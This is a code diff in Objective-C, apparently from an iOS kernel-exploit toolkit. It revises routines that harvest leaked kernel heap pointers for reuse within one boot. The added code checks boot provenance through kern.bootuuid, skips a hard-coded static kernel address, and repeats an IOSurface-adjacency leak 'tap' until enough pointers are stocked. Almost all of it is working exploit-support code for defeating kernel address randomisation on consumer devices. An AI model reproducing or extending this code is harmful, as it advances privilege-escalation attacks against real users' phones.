@@ -10,6 +10,14 @@
 #import <Foundation/Foundation.h>
 #import <sys/sysctl.h>
 
+static NSString *labha_boot_uuid(void) {
+    char buf[64];
+    size_t len = sizeof(buf) - 1;
+    if (sysctlbyname("kern.bootuuid", buf, &len, NULL, 0) != 0) return nil;
+    buf[len] = 0;
+    return [NSString stringWithFormat:@"%s", buf];
+}
+
 static uint64_t labha_boot_secs(void) {
     struct timeval tv;
     size_t len = sizeof(tv);
@@ -32,6 +40,7 @@ int LabHeapAnchorsSameBoot(int max, uint64_t *out) {
 
     uint64_t boot = labha_boot_secs();
     if (boot == 0) return 0;
+    NSString *bootUUID = labha_boot_uuid();
 
     NSDateFormatter *df = [[NSDateFormatter alloc] init];
     df.locale = [NSLocale localeWithLocaleIdentifier:@"en_US_POSIX"];
@@ -62,12 +71,21 @@ int LabHeapAnchorsSameBoot(int max, uint64_t *out) {
             /* shape gate: kernel-pointer band only, and never a static */
             if (va == 0 || (va >> 48) != 0xffffULL) continue;
             if (va == 0xfffffe0007004000ULL) continue;   /* static_base, not heap */
-            /* same-boot provenance: the leak's own stamp must postdate boot */
-            NSString *ts = ([e[@"time"] isKindOfClass:[NSString class]]) ? e[@"time"] : nil;
-            NSDate *t = ts ? [df dateFromString:ts] : nil;
-            if (!t) continue;
-            if ([t timeIntervalSince1970] < (NSTimeInterval)boot - 1) continue;  /* clock skew slack */
-            [cands addObject:@{ @"va": @(va), @"t": t }];
+            /* same-boot provenance: boot_uuid when the entry carries it
+               (2026-11-19: bulletproof — no timezone-parse risk), else the
+               legacy time-stamp check. */
+            NSString *bu = ([e[@"boot_uuid"] isKindOfClass:[NSString class]]) ? e[@"boot_uuid"] : nil;
+            NSDate *t = nil;
+            if (bu.length > 0) {
+                if (![bu isEqualToString:bootUUID]) continue;   /* different boot — never reuse */
+                t = [NSDate date];   /* uuid-verified: stamp now for ordering */
+            } else {
+                NSString *ts = ([e[@"time"] isKindOfClass:[NSString class]]) ? e[@"time"] : nil;
+                t = ts ? [df dateFromString:ts] : nil;
+                if (!t) continue;
+                if ([t timeIntervalSince1970] < (NSTimeInterval)boot - 1) continue;  /* clock skew slack */
+            }
+            if (t) [cands addObject:@{ @"va": @(va), @"t": t }];
             }
         } @catch (__unused NSException *e) { continue; }
     }
@@ -90,8 +108,15 @@ int LabHeapAnchorHarvestIfThin(int want) {
     uint64_t buf[8];
     int have = LabHeapAnchorsSameBoot(8, buf);
     if (have >= want) return have;
-    /* thin: run ONE P159 harvest tap (self-bounded rounds; records every
-       distinct canonical kptr to the board). Read-only, never blocks. */
-    (void)[P159IOSurfaceAdjacency tap];
-    return LabHeapAnchorsSameBoot(8, buf);
+    /* 2026-11-19 receipt: ONE harvest tap yields nothing on the sparse 17
+       (the user's manual rhythm was "tap p159 a few times"). Two attempts,
+       each an 8-round P159 tap — churn until the anchor set is stocked,
+       bounded at 16 rounds total. Read-only, never blocks. */
+    for (int att = 0; att < 2; att++) {
+        (void)[P159IOSurfaceAdjacency tap];
+        have = LabHeapAnchorsSameBoot(8, buf);
+        if (have >= want) return have;
+        usleep(500000);
+    }
+    return have;
 }
